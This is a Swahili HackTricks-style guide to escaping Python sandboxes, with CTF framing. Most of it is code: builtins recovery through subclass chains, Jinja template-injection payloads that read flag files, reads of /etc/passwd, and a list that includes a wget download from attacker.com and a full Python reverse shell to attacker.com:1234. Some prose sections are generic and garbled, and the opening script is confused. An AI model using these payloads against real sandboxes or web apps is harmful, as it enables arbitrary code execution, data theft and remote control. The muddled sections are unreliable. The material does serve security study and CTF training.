Kificho hapo juu kinaonyesha jinsi ya kusoma faili kwa kutumia `builtins` na leseni.

```python
import builtins

def soma_faili(chemin_faili):
    with open(chemin_faili, 'r') as faili:
        maudhui = faili.read()
    return maudhui

def pita_sandbox(chemin_faili):
    sandbox = builtins.__dict__['__import__']('os')
    return sandbox.system(f'cat {chemin_faili}')

def kuu():
    chemin_faili = input('Ingiza njia ya faili: ')
    maudhui = soma_faili(chemin_faili)
    print(maudhui)

    pita = input('Pita sandbox? (n/e): ')
    if pita.lower() == 'n':
        pita_sandbox(chemin_faili)

if __name__ == '__main__':
    kuu()
```
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inatekeleza uchunguzi wa vitisho wa kujitolea, inapata matatizo katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Vipengele vya Kujengwa

* [**Vipengele vya kujengwa vya python2**](https://docs.python.org/2/library/functions.html)
* [**Vipengele vya kujengwa vya python3**](https://docs.python.org/3/library/functions.html)

Ikiwa unaweza kupata kwa **`__builtins__`** unaweza kuagiza maktaba (kumbuka kuwa unaweza pia kutumia hapa uwakilishi mwingine wa herufi ulioonyeshwa katika sehemu ya mwisho):
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### Hakuna Builtins

Unapokuwa huna `__builtins__` huwezi kuweza kuimport chochote wala kusoma au kuandika faili kwa sababu **hakuna kazi za kawaida** (kama vile `open`, `import`, `print`...) **zimepakiwa**.\
Hata hivyo, **kwa chaguo-msingi python inapakia moduli nyingi kwenye kumbukumbu**. Moduli hizi zinaweza kuonekana kuwa salama, lakini baadhi yao **zinafungua** **kazi hatari** ndani yao ambazo zinaweza kutumiwa kupata **utekelezaji wa nambari yoyote**.

Katika mifano ifuatayo unaweza kuona jinsi ya **kutumia vibaya** baadhi ya moduli hizi "**salama**" zilizopakiwa ili kupata **kazi hatari** ndani yao.

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Python3 ni lugha ya programu ambayo ina nguvu na inayotumiwa sana kwa maendeleo ya programu. Ina vifurushi vingi na maktaba ambazo hufanya iwe rahisi kwa watumiaji kuunda programu za ubunifu na za nguvu.

##### Kuepuka Sanduku za Python

Sanduku za Python ni mazingira ya usalama ambayo yanazuia utekelezaji wa hatari na hatari katika programu ya Python. Hata hivyo, kuna njia kadhaa za kuzunguka sanduku hizi ili kuwezesha utekelezaji wa hatari.

##### Kuzunguka Sanduku za Python

1. **Kuondoa Vizuizi vya Kuingia** - Unaweza kuzunguka sanduku za Python kwa kuondoa vizuizi vya kuingia. Hii inaweza kufanywa kwa kubadilisha mipangilio ya usalama au kwa kutumia mbinu za kudanganya mfumo.

2. **Kuondoa Vizuizi vya Kutoka** - Unaweza pia kuzunguka sanduku za Python kwa kuondoa vizuizi vya kutoka. Hii inaweza kufanywa kwa kubadilisha mipangilio ya usalama au kwa kutumia mbinu za kudanganya mfumo.

3. **Kuondoa Vizuizi vya Kukimbia** - Ikiwa sanduku ya Python inazuia kukimbia kwa programu zisizoaminika, unaweza kuzunguka hii kwa kubadilisha mipangilio ya usalama au kwa kutumia mbinu za kudanganya mfumo.

4. **Kuondoa Vizuizi vya Kusoma** - Ikiwa sanduku ya Python inazuia kusoma kwa faili au data, unaweza kuzunguka hii kwa kubadilisha mipangilio ya usalama au kwa kutumia mbinu za kudanganya mfumo.

5. **Kuondoa Vizuizi vya Kuandika** - Ikiwa sanduku ya Python inazuia kuandika kwenye faili au data, unaweza kuzunguka hii kwa kubadilisha mipangilio ya usalama au kwa kutumia mbinu za kudanganya mfumo.

##### Hitimisho

Kuzunguka sanduku za Python inaweza kuwa muhimu katika mazingira fulani, kama vile wakati wa kufanya upimaji wa usalama au kufanya uchunguzi wa kina. Hata hivyo, ni muhimu kutambua kuwa kuzunguka sanduku za Python kunaweza kuwa kinyume cha sheria na inaweza kusababisha madhara makubwa. Ni muhimu kuzingatia sheria na kufuata maadili ya kitaalam wakati wa kufanya shughuli za kuzunguka sanduku za Python.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**Hapa chini kuna kazi kubwa**](./#recursive-search-of-builtins-globals) ya kutafuta mamia ya **maeneo** ambapo unaweza kupata **builtins**.

#### Python2 na Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### Mifurushi ya Kujengwa Ndani

Hapa chini ni orodha ya mifurushi ya kujengwa ndani ambayo inaweza kutumika kwa kubadilisha kificho cha Python ili kuepuka sanduku la usalama:

- `__import__('os').system('command')`: Inatumika kutekeleza amri ya mfumo kwenye mfumo wa uendeshaji.
- `__import__('subprocess').call('command', shell=True)`: Inatumika kutekeleza amri ya mfumo kwenye mfumo wa uendeshaji na kurejesha matokeo yake.
- `__import__('os').popen('command').read()`: Inatumika kutekeleza amri ya mfumo kwenye mfumo wa uendeshaji na kusoma matokeo yake.
- `__import__('os').system('wget -O /tmp/file http://attacker.com/file')`: Inatumika kupakua faili kutoka kwa mtandao na kuihifadhi kwenye eneo la muda la mfumo.
- `__import__('os').system('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'attacker.com\',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"')`: Inatumika kuanzisha kikao cha mbali na kudhibiti mfumo wa lengo.

Tafadhali kumbuka kuwa matumizi ya mifurushi hii ya kujengwa ndani yanaweza kuwa kinyume cha sheria na yanapaswa kutumiwa tu kwa madhumuni ya kujifunza na upimaji wa usalama.
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## Globals na locals

Kuangalia **`globals`** na **`locals`** ni njia nzuri ya kujua unaweza kupata nini.
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**Hapa chini kuna kazi kubwa**](./#recursive-search-of-builtins-globals) ya kupata mamia ya **maeneo** ambapo unaweza kupata **globals**.

## Kugundua Utekelezaji wa Kiholela

Hapa nataka kuelezea jinsi ya kugundua kwa urahisi **kazi hatari zaidi zilizopakia** na kupendekeza mbinu za kuaminika zaidi za kudukua.

#### Kupata darasa ndogo kwa kuzidisha

Moja ya sehemu nyeti zaidi ya mbinu hii ni kuweza **kupata darasa la msingi**. Katika mifano iliyotangulia hii ilifanywa kwa kutumia `''.__class__.__base__.__subclasses__()` lakini kuna **njia nyingine zinazowezekana**:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### Kupata maktaba hatari zilizopakiwa

Kwa mfano, kwa kujua kwamba na maktaba ya **`sys`** ni **inawezekana kuagiza maktaba za aina yoyote**, unaweza kutafuta **moduli zote zilizopakiwa ambazo zimeagiza sys ndani yao**:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
Kuna mengi, na **tunahitaji moja tu** kutekeleza amri:
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
Tunaweza kufanya jambo sawa na **maktaba nyingine** ambazo tunajua zinaweza kutumika kutekeleza amri:
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
Zaidi ya hayo, tunaweza hata kutafuta ni moduli zipi zinazopakia maktaba za kudhuru:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
Zaidi ya hayo, ikiwa unaamini **maktaba zingine** zinaweza kuwa na uwezo wa **kuita kazi za kutekeleza amri**, tunaweza pia **kuchuja kwa majina ya kazi** ndani ya maktaba zinazowezekana:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, 